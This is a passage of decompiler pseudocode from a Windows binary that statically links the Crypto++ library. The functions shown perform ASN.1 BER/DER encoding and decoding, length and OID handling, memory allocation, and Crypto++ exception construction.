      v8 = v9 < 4;
      v9 -= 4;
      if ( v8 )
        goto LABEL_5;
    }
  }
  LOBYTE(v5) = *(_BYTE *)v4;
  if ( *(_BYTE *)v4 != *(_BYTE *)v6
    || v9 != -3
    && ((LOBYTE(v5) = *((_BYTE *)v4 + 1), (_BYTE)v5 != *(_BYTE *)(v6 + 1))
     || v9 != -2
     && ((LOBYTE(v5) = *((_BYTE *)v4 + 2), (_BYTE)v5 != *(_BYTE *)(v6 + 2))
      || v9 != -1 && *((_BYTE *)v4 + 3) != *(_BYTE *)(v6 + 3))) )
  {
LABEL_14:
    sub_433790(v5);
  }
LABEL_13:
  sub_408A00(&v10);
}
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 4B8A28: using guessed type void *CryptoPP::OID::`vftable';

//----- (00433790) --------------------------------------------------------
void __noreturn sub_433790()
{
  char pExceptionObject[40]; // [esp+0h] [ebp-2Ch] BYREF

  sub_432A90(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVBERDecodeErr_CryptoPP__);
}
// 433790: using guessed type void __noreturn sub_433790();

//----- (004337C0) --------------------------------------------------------
char __cdecl sub_4337C0(int a1)
{
  int v1; // esi
  int v2; // ecx
  char result; // al
  int v4; // [esp+4h] [ebp-4h] BYREF

  v1 = a1;
  if ( !(*(int (__thiscall **)(int, int *))(*(_DWORD *)a1 + 76))(a1, &a1)
    || (_BYTE)a1 != 5
    || (result = sub_433820(v1, &v4)) == 0
    || v4 )
  {
    sub_433790(v2);
  }
  return result;
}
// 4337F9: variable 'v2' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);

//----- (00433800) --------------------------------------------------------
void __thiscall sub_433800(void *this, int a2)
{
  sub_434090(a2, (int)this + 12);
}

//----- (00433820) --------------------------------------------------------
char __cdecl sub_433820(int a1, _DWORD *a2)
{
  int v2; // ecx
  char v4; // [esp+3h] [ebp-9h] BYREF
  __int64 v5; // [esp+4h] [ebp-8h] BYREF

  v4 = 0;
  v5 = 0i64;
  if ( !sub_433890(a1, (int *)&v5, &v4) || (v2 = v5, *a2 = v5, HIDWORD(v5)) )
    sub_433790(v2);
  return v4;
}
// 43387E: variable 'v2' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);

//----- (00433890) --------------------------------------------------------
char __cdecl sub_433890(int a1, int *a2, _BYTE *a3)
{
  int v3; // ebx
  unsigned __int8 v4; // cl
  int v6; // esi
  int *v7; // ebp
  unsigned int v8; // edi
  int v9; // ecx

  v3 = a1;
  if ( (*(int (__thiscall **)(int, int *))(*(_DWORD *)a1 + 76))(a1, &a1) )
  {
    v4 = a1;
    if ( (a1 & 0x80u) == 0 )
    {
      *a3 = 1;
      *(_QWORD *)a2 = v4;
      return 1;
    }
    v6 = a1 & 0x7F;
    if ( (a1 & 0x7F) == 0 )
    {
      *a3 = 0;
      return 1;
    }
    v7 = a2;
    v8 = 0;
    v9 = 0;
    *a3 = 1;
    *v7 = 0;
    v7[1] = 0;
    while ( 1 )
    {
      --v6;
      if ( v8 >= 0x1000000 )
        sub_433790(v9);
      if ( !(*(int (__thiscall **)(int, int *))(*(_DWORD *)v3 + 76))(v3, &a1) )
        break;
      v8 = *(_QWORD *)v7 >> 24;
      v9 = (unsigned __int8)a1 | (*v7 << 8);
      v7[1] = v8;
      *v7 = v9;
      if ( !v6 )
        return 1;
    }
  }
  return 0;
}
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);

//----- (00433970) --------------------------------------------------------
int __thiscall sub_433970(int this, int a2, int a3, unsigned int a4, unsigned int a5, int a6, int a7)
{
  unsigned int v7; // esi
  unsigned int v8; // edx

  v7 = a5;
  if ( *(_BYTE *)(this + 33) )
  {
    if ( a5 > *(_DWORD *)(this + 28) || (v8 = a4, a5 >= *(_DWORD *)(this + 28)) && a4 >= *(_DWORD *)(this + 24) )
    {
      v7 = *(_DWORD *)(this + 28);
      v8 = *(_DWORD *)(this + 24);
    }
  }
  else
  {
    v8 = a4;
  }
  return (*(int (__thiscall **)(_DWORD, int, int, unsigned int, unsigned int, int, int))(**(_DWORD **)(this + 20) + 132))(
           *(_DWORD *)(this + 20),
           a2,
           a3,
           v8,
           v7,
           a6,
           a7);
}

//----- (004339C0) --------------------------------------------------------
void __thiscall sub_4339C0(_DWORD *this, int a2)
{
  int *v3; // ebx
  char *v4; // edx
  char v5; // cl
  unsigned int v6; // edi
  int v7; // ecx
  unsigned int v8; // ebx
  unsigned int v9; // eax
  unsigned int v10; // esi
  unsigned int v11; // ecx
  unsigned int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // esi
  int v15; // eax
  __int64 v16; // rax
  int v17[2]; // [esp+10h] [ebp-8Ch] BYREF
  int *v18; // [esp+18h] [ebp-84h]
  _DWORD *v19; // [esp+1Ch] [ebp-80h]
  char v20[4]; // [esp+20h] [ebp-7Ch] BYREF
  char pExceptionObject[40]; // [esp+24h] [ebp-78h] BYREF
  _DWORD v22[6]; // [esp+4Ch] [ebp-50h] BYREF
  int v23[10]; // [esp+64h] [ebp-38h] BYREF
  int v24; // [esp+98h] [ebp-4h]

  v19 = this;
  v3 = (int *)a2;
  v18 = (int *)a2;
  sub_45F0D0((int)v23, 0);
  v4 = (char *)this[1];
  v5 = *v4;
  v24 = 0;
  v20[0] = v4[4] + 40 * v5;
  (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v23[0] + 24))(v23, v20, 1, 0, 1);
  v6 = 2;
  v7 = this[1];
  if ( (unsigned int)((this[2] - v7) >> 2) > 2 )
  {
    do
    {
      v8 = *(_DWORD *)(v7 + 4 * v6);
      if ( v8 )
      {
        v10 = 0;
        v9 = 32;
        do
        {
          v11 = (v9 + v10) >> 1;
          if ( !(v8 >> v11) )
          {
            v9 = (v9 + v10) >> 1;
            v11 = v10;
          }
          v10 = v11;
        }
        while ( v9 - v11 > 1 );
      }
      else
      {
        v9 = 0;
      }
      v12 = 7;
      if ( v9 > 7 )
        v12 = v9;
      if ( v12 > 0xFFFFFFF9 )
      {
        sub_419B80((int)v22, "RoundUpToMultipleOf: integer overflow");
        LOBYTE(v24) = 1;
        sub_405230(pExceptionObject, v22);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
      }
      v13 = v12 + 6 - (v12 + 6) % 7;
      v14 = v13 - 7;
      if ( v13 != 7 )
      {
        do
        {
          v20[0] = (v8 >> v14) | 0x80;
          (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v23[0] + 24))(v23, v20, 1, 0, 1);
          v14 -= 7;
        }
        while ( v14 );
      }
      v20[0] = v8 & 0x7F;
      (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v23[0] + 24))(v23, v20, 1, 0, 1);
      ++v6;
      v7 = v19[1];
    }
    while ( v6 < (v19[2] - v7) >> 2 );
    v3 = v18;
  }
  v15 = *v3;
  v20[0] = 6;
  (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v15 + 24))(v3, v20, 1, 0, 1);
  v16 = sub_45F890(v23);
  sub_433FC0(v3, v16);
  v17[0] = -1;
  v17[1] = -1;
  (*(void (__thiscall **)(int *, int *, int *, int *, int))(v23[0] + 128))(v23, v3, v17, &dword_4EEDC0, 1);
  boost::exception::~exception((boost::exception *)v23);
}
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);
// 4EEDC0: using guessed type int dword_4EEDC0;
// 4339C0: using guessed type char var_7C[4];
// 4339C0: using guessed type _DWORD var_50[6];

//----- (00433BB0) --------------------------------------------------------
void __thiscall sub_433BB0(int *this, int a2)
{
  _BYTE *v3; // ecx
  unsigned int v4; // eax
  unsigned int v5; // esi
  int v6; // eax
  _DWORD *v7; // eax
  int v8; // eax
  _DWORD v9[4]; // [esp+Ch] [ebp-BCh] BYREF
  char v10[4]; // [esp+1Ch] [ebp-ACh] BYREF
  int v11[11]; // [esp+20h] [ebp-A8h] BYREF
  __int16 v12; // [esp+4Ch] [ebp-7Ch]
  int v13[11]; // [esp+50h] [ebp-78h] BYREF
  __int16 v14; // [esp+7Ch] [ebp-4Ch]
  int v15[11]; // [esp+80h] [ebp-48h] BYREF
  __int16 v16; // [esp+ACh] [ebp-1Ch]
  int v17; // [esp+B0h] [ebp-18h] BYREF
  char v18; // [esp+B4h] [ebp-14h]
  char v19[3]; // [esp+B5h] [ebp-13h] BYREF
  int v20; // [esp+C4h] [ebp-4h]

  sub_45F0D0((int)v15, 0);
  v15[10] = a2;
  v16 = 48;
  v15[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v15[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v20 = 0;
  v3 = (char *)&v17 + 1;
  v17 = 0;
  v4 = 4;
  v18 = 0;
  do
  {
    if ( *v3 )
      break;
    --v4;
    ++v3;
  }
  while ( v4 > 1 );
  v10[0] = 2;
  v5 = v4 + 1;
  if ( v19[-v4] >= 0 )
    v5 = v4;
  sub_45FD50(v15, v10, 1u, 0, 1);
  sub_433FC0(v15, v5);
  (*(void (__thiscall **)(int *, char *, unsigned int, _DWORD, int))(v15[0] + 24))(v15, &v19[-v5], v5, 0, 1);
  sub_45F0D0((int)v13, 0);
  v14 = 48;
  v13[10] = (int)v15;
  v13[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v13[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v6 = *this;
  LOBYTE(v20) = 1;
  v7 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD *))(v6 + 16))(this, v9);
  LOBYTE(v20) = 2;
  sub_4339C0(v7, (int)v13);
  LOBYTE(v20) = 1;
  sub_408A00(v9);
  (*(void (__thiscall **)(int *, int *))(*this + 24))(this, v13);
  sub_434250((int)v13);
  sub_45F0D0((int)v11, 0);
  v11[0] = (int)&CryptoPP::DERGeneralEncoder::`vftable';
  v11[1] = (int)&CryptoPP::DERGeneralEncoder::`vftable';
  v11[10] = (int)v15;
  v12 = 4;
  v8 = *this;
  LOBYTE(v20) = 3;
  (*(void (__thiscall **)(int *, int *))(v8 + 32))(this, v11);
  sub_434250((int)v11);
  (*(void (__thiscall **)(int *, int *))(*this + 40))(this, v15);
  sub_434250((int)v15);
  sub_432CF0((int)v11);
  sub_432CF0((int)v13);
  sub_432CF0((int)v15);
}
// 4B8AFC: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4B8BB4: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4B8C90: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 4B8D48: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 433BB0: using guessed type char var_AC[4];
// 433BB0: using guessed type _DWORD var_BC[4];

//----- (00433D80) --------------------------------------------------------
void __thiscall sub_433D80(int *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-20h] BYREF
  char v6[4]; // [esp+18h] [ebp-10h] BYREF
  int v7; // [esp+24h] [ebp-4h]
  int v8[11]; // [esp+28h] [ebp+0h] BYREF
  __int16 v9; // [esp+54h] [ebp+2Ch]
  int v10[11]; // [esp+58h] [ebp+30h] BYREF
  __int16 v11; // [esp+84h] [ebp+5Ch]
  int v12[11]; // [esp+88h] [ebp+60h] BYREF
  __int16 v13; // [esp+B4h] [ebp+8Ch]

  sub_45F0D0((int)v8, 0);
  v8[10] = a2;
  v9 = 48;
  v8[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v8[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v7 = 0;
  sub_45F0D0((int)v10, 0);
  v11 = 48;
  v10[10] = (int)v8;
  v10[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v10[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v3 = *this;
  LOBYTE(v7) = 1;
  v4 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD *))(v3 + 16))(this, v5);
  LOBYTE(v7) = 2;
  sub_4339C0(v4, (int)v10);
  LOBYTE(v7) = 1;
  sub_408A00(v5);
  (*(void (__thiscall **)(int *, int *))(*this + 24))(this, v10);
  sub_434250((int)v10);
  sub_45F0D0((int)v12, 0);
  v12[0] = (int)&CryptoPP::DERGeneralEncoder::`vftable';
  v12[1] = (int)&CryptoPP::DERGeneralEncoder::`vftable';
  v12[10] = (int)v8;
  v13 = 3;
  LOBYTE(v7) = 3;
  v6[0] = 0;
  sub_45FD50(v12, v6, 1u, 0, 1);
  (*(void (__thiscall **)(int *, int *))(*this + 32))(this, v12);
  sub_434250((int)v12);
  sub_434250((int)v8);
  sub_432CF0((int)v12);
  sub_432CF0((int)v10);
  sub_432CF0((int)v8);
}
// 4B8AFC: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4B8BB4: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4B8C90: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 4B8D48: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 433D80: using guessed type _DWORD var_B4[4];
// 433D80: using guessed type char var_A4[4];

//----- (00433EF0) --------------------------------------------------------
int __cdecl sub_433EF0(int *a1)
{
  int *v1; // esi
  int v2; // eax
  int v3; // eax
  char v5[4]; // [esp+8h] [ebp-4h] BYREF

  v1 = a1;
  v2 = *a1;
  v5[0] = 5;
  (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v2 + 24))(a1, v5, 1, 0, 1);
  v3 = *v1;
  LOBYTE(a1) = 0;
  return (*(int (__thiscall **)(int *, int **, int, _DWORD, int))(v3 + 24))(v1, &a1, 1, 0, 1);
}
// 433EF0: using guessed type char var_4[4];

//----- (00433F30) --------------------------------------------------------
int __cdecl sub_433F30(int *a1, int a2, unsigned int a3)
{
  int v3; // eax
  int v4; // esi
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v3 = *a1;
  LOBYTE(v6) = 4;
  (*(void (__thiscall **)(int *, int *, int, _DWORD, int))(v3 + 24))(a1, &v6, 1, 0, 1);
  v4 = sub_433FC0(a1, a3);
  (*(void (__thiscall **)(int *, int, unsigned int, _DWORD, int))(*a1 + 24))(a1, a2, a3, 0, 1);
  return v4 + a3 + 1;
}

//----- (00433F80) --------------------------------------------------------
int __thiscall sub_433F80(_DWORD *this, int a2)
{
  int v2; // eax
  __int64 v4; // [esp+0h] [ebp-8h] BYREF

  v2 = this[3];
  v4 = 0i64;
  return (*(int (__thiscall **)(_DWORD *, int, __int64 *, int, int, int *, int))(v2 + 132))(
           this + 3,
           a2,
           &v4,
           -1,
           -1,
           &dword_4EEDC0,
           1);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00433FC0) --------------------------------------------------------
int __cdecl sub_433FC0(int *a1, unsigned __int64 a2)
{
  unsigned int v2; // ebp
  void (__thiscall *v3)(int *, int *, int, _DWORD, int); // edi
  int v5; // ebx
  int v6; // edi
  int v7; // edx
  int v8; // [esp+1Ch] [ebp-8h] BYREF
  int v9; // [esp+20h] [ebp-4h]

  v2 = HIDWORD(a2);
  v3 = *(void (__thiscall **)(int *, int *, int, _DWORD, int))(*a1 + 24);
  if ( a2 > 0x7F )
  {
    v5 = sub_432830((unsigned int *)&a2);
    LOBYTE(v8) = v5 | 0x80;
    v3(a1, &v8, 1, 0, 1);
    if ( v5 )
    {
      v6 = 8 * v5 - 8;
      v9 = v5 + 1;
      do
      {
        v7 = *a1;
        LOBYTE(v8) = __PAIR64__(v2, a2) >> v6;
        (*(void (__thiscall **)(int *, int *, int, _DWORD, int))(v7 + 24))(a1, &v8, 1, 0, 1);
        v6 -= 8;
        --v5;
      }
      while ( v5 );
      return v9;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    v3(a1, (int *)&a2, 1, 0, 1);
    return 1;
  }
}

//----- (00434090) --------------------------------------------------------
void __cdecl sub_434090(int a1, int a2)
{
  char v2; // bl
  int v3; // ecx
  bool v4; // zf
  __int64 v5; // [esp+Ch] [ebp-78h] BYREF
  int v6; // [esp+14h] [ebp-70h] BYREF
  unsigned __int16 v7; // [esp+18h] [ebp-6Ch] BYREF
  int v8[11]; // [esp+1Ch] [ebp-68h] BYREF
  char v9; // [esp+48h] [ebp-3Ch]
  char v10; // [esp+49h] [ebp-3Bh]
  int v11[5]; // [esp+4Ch] [ebp-38h] BYREF
  int *v12; // [esp+60h] [ebp-24h]
  __int64 v13; // [esp+64h] [ebp-20h]
  char v14; // [esp+6Ch] [ebp-18h]
  char v15; // [esp+6Dh] [ebp-17h]
  int v16; // [esp+80h] [ebp-4h]

  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 84))(a1, &v6);
  sub_432B70(v11, a1, v6);
  v2 = v6;
  v16 = 0;
  sub_45F0D0((int)v8, 0);
  v8[0] = (int)&CryptoPP::DERGeneralEncoder::`vftable';
  v8[1] = (int)&CryptoPP::DERGeneralEncoder::`vftable';
  v8[10] = a2;
  v9 = v2;
  v10 = 0;
  LOBYTE(v16) = 1;
  if ( !v15 )
  {
    while ( 1 )
    {
      if ( sub_437840(v12, &v7, 1) == 2 )
      {
        v4 = v7 == 0;
        goto LABEL_10;
      }
      while ( 1 )
      {
        sub_434090(v11, v8);
        if ( !v15 )
          break;
        v4 = v13 == 0;
LABEL_10:
        if ( v4 )
          goto LABEL_3;
      }
    }
  }
  v5 = v13;
  (*(void (__thiscall **)(int *, int *, __int64 *, int *, int))(v11[0] + 128))(v11, v8, &v5, &dword_4EEDC0, 1);
LABEL_3:
  v14 = 1;
  if ( v15 )
  {
    if ( !v13 )
      goto LABEL_14;
LABEL_15:
    sub_433790(v3);
  }
  if ( sub_437500(v12, &v7, 1) != 2 || v7 )
    goto LABEL_15;
LABEL_14:
  sub_434250((int)v8);
  sub_432CF0((int)v8);
  sub_432C40(v11);
}
// 4341D7: variable 'v3' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 4B8AFC: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4B8BB4: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004341F0) --------------------------------------------------------
__int64 __thiscall sub_4341F0(int this)
{
  return sub_45F890((_DWORD *)*(_DWORD *)(this + 12)) - *(_QWORD *)(this + 24);
}

//----- (00434210) --------------------------------------------------------
int __thiscall sub_434210(int this)
{
  bool v1; // zf
  int result; // eax
  int v3; // ecx
  int v4; // [esp+0h] [ebp-4h] BYREF

  v4 = this;
  v1 = *(_BYTE *)(this + 33) == 0;
  *(_BYTE *)(this + 32) = 1;
  if ( v1 )
  {
    result = sub_437500(*(void **)(this + 20), (unsigned __int16 *)&v4, 1);
    if ( result != 2 || (_WORD)v4 )
      sub_433790(v3);
  }
  else
  {
    result = *(_DWORD *)(this + 28) | *(_DWORD *)(this + 24);
    if ( *(_QWORD *)(this + 24) )
      sub_433790(this);
  }
  return result;
}
// 434246: variable 'v3' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);

//----- (00434250) --------------------------------------------------------
int __thiscall sub_434250(int this)
{
  __int64 v2; // rax
  int v3; // ecx
  unsigned int v4; // ebp
  unsigned int v5; // edi
  int *v6; // esi
  int v7; // eax
  char v9[4]; // [esp+10h] [ebp-Ch] BYREF
  int v10[2]; // [esp+14h] [ebp-8h] BYREF

  v10[0] = this;
  *(_BYTE *)(this + 45) = 1;
  v2 = sub_45F890((_DWORD *)this);
  v3 = *(_DWORD *)(this + 40);
  v4 = v2;
  v9[0] = *(_BYTE *)(this + 44);
  v5 = HIDWORD(v2);
  (*(void (__thiscall **)(int, char *, int, _DWORD, int))(*(_DWORD *)v3 + 24))(v3, v9, 1, 0, 1);
  v6 = (int *)v10[0];
  sub_433FC0(*(int **)(v10[0] + 40), __PAIR64__(v5, v4));
  v7 = *v6;
  v10[0] = -1;
  v10[1] = -1;
  return (*(int (__thiscall **)(int *, int, int *, int *, int))(v7 + 128))(v6, v6[10], v10, &dword_4EEDC0, 1);
}
// 4EEDC0: using guessed type int dword_4EEDC0;
// 434250: using guessed type char var_C[4];

//----- (004342D0) --------------------------------------------------------
int __thiscall sub_4342D0(int this, int a2, unsigned int *a3, int a4, int a5)
{
  unsigned int v6; // ecx
  unsigned int v7; // eax
  int v8; // ebx
  unsigned int v9; // edx
  unsigned int v10; // ecx

  if ( *(_BYTE *)(this + 33) )
  {
    v6 = *(_DWORD *)(this + 28);
    v7 = *(_DWORD *)(this + 24);
    if ( *(_QWORD *)a3 > __PAIR64__(v6, v7) )
    {
      *a3 = v7;
      a3[1] = v6;
    }
  }
  v8 = (*(int (__thiscall **)(_DWORD, int, unsigned int *, int, int))(**(_DWORD **)(this + 20) + 128))(
         *(_DWORD *)(this + 20),
         a2,
         a3,
         a4,
         a5);
  if ( *(_BYTE *)(this + 33) )
  {
    v9 = *(_DWORD *)(this + 28);
    v10 = *(_DWORD *)(this + 24);
    if ( __PAIR64__(v9, v10) < *(_QWORD *)a3 )
      sub_433790(v10);
    *(_QWORD *)(this + 24) = __PAIR64__(v9, v10) - *(_QWORD *)a3;
  }
  return v8;
}
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);

//----- (00434350) --------------------------------------------------------
int __thiscall sub_434350(_DWORD *this, int a2, int a3, int a4)
{
  _DWORD *v5; // eax
  int result; // eax

  v5 = (_DWORD *)*this;
  if ( *this )
  {
    if ( ((this[2] - (_DWORD)v5) & 0xFFFFFFFC) >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_46C87D(v5);
  }
  *this = a2;
  this[1] = a2 + 4 * a3;
  result = a2 + 4 * a4;
  this[2] = result;
  return result;
}

//----- (004343B0) --------------------------------------------------------
_DWORD *__stdcall sub_4343B0(unsigned int a1)
{
  unsigned int v1; // ecx
  size_t v2; // eax
  void *v3; // eax
  void *v4; // ecx
  _DWORD *result; // eax

  v1 = 4 * a1;
  if ( a1 <= 0x3FFFFFFF )
  {
    if ( v1 < 0x1000 )
    {
      if ( v1 )
        return operator new(4 * a1);
      else
        return 0;
    }
  }
  else
  {
    v1 = -1;
  }
  v2 = v1 + 35;
  if ( v1 + 35 <= v1 )
    v2 = -1;
  v3 = operator new(v2);
  v4 = v3;
  if ( !v3 )
    _invalid_parameter_noinfo_noreturn();
  result = (_DWORD *)(((unsigned int)v3 + 35) & 0xFFFFFFE0);
  *(result - 1) = v4;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00434410) --------------------------------------------------------
int __cdecl sub_434410(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // edi
  unsigned int v4; // edx
  unsigned int v5; // eax
  int result; // eax
  int v7; // esi
  char v8; // al
  int v9; // edi
  char v10; // al
  size_t v11; // edx
  __int64 v12; // kr08_8
  void **v13; // ecx
  unsigned int v14; // edi
  int v15; // ecx
  size_t v16; // eax
  void *v17; // eax
  _DWORD *v18; // esi
  _DWORD *v19; // eax
  _BYTE *v20; // edi
  char *v21; // edi
  char *v22; // eax
  __int128 *v23; // eax
  void *v24; // ecx
  __int128 v25; // xmm0
  __int64 v26; // xmm1_8
  char v27; // [esp+10h] [ebp-5Ch]
  _BYTE *v28; // [esp+14h] [ebp-58h]
  int v29; // [esp+1Ch] [ebp-50h]
  int v30; // [esp+20h] [ebp-4Ch]
  _BYTE *Size; // [esp+24h] [ebp-48h]
  char v32; // [esp+28h] [ebp-44h]
  char v33; // [esp+28h] [ebp-44h]
  __int128 v34; // [esp+2Ch] [ebp-40h] BYREF
  __int64 v35; // [esp+3Ch] [ebp-30h]
  void *Src[4]; // [esp+44h] [ebp-28h] BYREF
  __int64 v37; // [esp+54h] [ebp-18h]
  int v38; // [esp+68h] [ebp-4h]
  int v39; // [esp+78h] [ebp+Ch]
  unsigned int v40; // [esp+7Ch] [ebp+10h]

  v3 = 0;
  v4 = a3 >> 26;
  v40 = a3 & 0x7FFFFFFF;
  v5 = a2;
  v27 = v4;
  if ( a2 )
  {
    v7 = 0;
    v35 = 0xF00000000i64;
    LOBYTE(v34) = 0;
    v38 = 0;
    while ( 1 )
    {
      v39 = v5 / v40;
      v30 = v5 % v40;
      v8 = v5 % v40 >= 0xA ? (~v27 & 0x20 | 0x41) - 10 : 48;
      v32 = v8;
      LOBYTE(v38) = 1;
      v9 = v3 | 2;
      v37 = 0xF00000000i64;
      LOBYTE(Src[0]) = 0;
      v29 = v9;
      sub_4196B0(Src, v7 + 1);
      v10 = v30 + v32;
      v11 = v37;
      v33 = v30 + v32;
      v12 = v37;
      if ( (unsigned int)v37 >= HIDWORD(v37) )
      {
        if ( (_DWORD)v37 == 0x7FFFFFFF )
          sub_4257D0();
        v14 = (v37 + 1) | 0xF;
        if ( v14 <= 0x7FFFFFFF )
        {
          v15 = HIDWORD(v37) >> 1;
          if ( HIDWORD(v37) <= 0x7FFFFFFF - (HIDWORD(v37) >> 1) )
          {
            if ( v14 < HIDWORD(v37) + v15 )
              v14 = HIDWORD(v37) + v15;
          }
          else
          {
            v14 = 0x7FFFFFFF;
          }
        }
        else
        {
          v14 = 0x7FFFFFFF;
        }
        if ( v14 + 1 < 0x1000 )
        {
          if ( v14 == -1 )
          {
            v18 = 0;
          }
          else
          {
            v19 = operator new(v14 + 1);
            v11 = v12;
            v18 = v19;
          }
        }
        else
        {
          v16 = v14 + 36;
          if ( v14 + 36 <= v14 + 1 )
            v16 = -1;
          v17 = operator new(v16);
          if ( !v17 )
LABEL_41:
            _invalid_parameter_noinfo_noreturn();
          v11 = v12;
          v18 = (_DWORD *)(((unsigned int)v17 + 35) & 0xFFFFFFE0);
          *(v18 - 1) = v17;
        }
        HIDWORD(v37) = v14;
        LODWORD(v37) = v11 + 1;
        v20 = (char *)v18 + v11;
        v28 = (char *)v18 + v11;
        Size = (char *)v18 + v11 + 1;
        if ( HIDWORD(v12) < 0x10 )
        {
          memmove(v18, Src, v11);
          *v20 = v33;
          *Size = 0;
        }
        else
        {
          v21 = (char *)Src[0];
          memmove(v18, Src[0], v11);
          *v28 = v33;
          *(_BYTE *)v12 = 0;
          v22 = v21;
          if ( (unsigned int)(HIDWORD(v12) + 1) >= 0x1000 )
          {
            v21 = (char *)*((_DWORD *)v21 - 1);
            if ( (unsigned int)(v22 - v21 - 4) > 0x1F )
              goto LABEL_41;
          }
          sub_46C87D(v21);
        }
        v9 = v29;
        Src[0] = v18;
      }
      else
      {
        LODWORD(v37) = v37 + 1;
        v13 = Src;
        if ( HIDWORD(v37) >= 0x10 )
          v13 = (void **)Src[0];
        *((_BYTE *)v13 + v11) = v10;
        *((_BYTE *)v13 + v11 + 1) = 0;
      }
      v23 = &v34;
      if ( HIDWORD(v35) >= 0x10 )
        v23 = (__int128 *)v34;
      sub_41F120((char *)Src, v23, v35);
      if ( HIDWORD(v35) >= 0x10 )
      {
        v24 = (void *)v34;
        if ( (unsigned int)(HIDWORD(v35) + 1) >= 0x1000 )
        {
          v24 = *(void **)(v34 - 4);
          if ( (unsigned int)(v34 - (_DWORD)v24 - 4) > 0x1F )
            goto LABEL_41;
        }
        sub_46C87D(v24);
      }
      v25 = *(_OWORD *)Src;
      v3 = v9 & 0xFFFFFFFD;
      v5 = v39;
      v26 = v37;
      v35 = v37;
      LOBYTE(v38) = 0;
      v34 = *(_OWORD *)Src;
      if ( !v39 )
        break;
      v7 = v35;
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1;
    *(_DWORD *)(a1 + 20) = 0;
    *(_OWORD *)a1 = v25;
    *(_QWORD *)(a1 + 16) = v26;
  }
  else
  {
    sub_419B80(a1, "0");
    return a1;
  }
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004346F0) --------------------------------------------------------
char *__thiscall sub_4346F0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8D80: using guessed type void *CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';

//----- (00434780) --------------------------------------------------------
char *__thiscall sub_434780(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::PK_SignatureScheme::KeyTooShort::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8D8C: using guessed type void *CryptoPP::PK_SignatureScheme::KeyTooShort::`vftable';

//----- (00434810) --------------------------------------------------------
char *__thiscall sub_434810(char *this)
{
  unsigned int v2; // edx
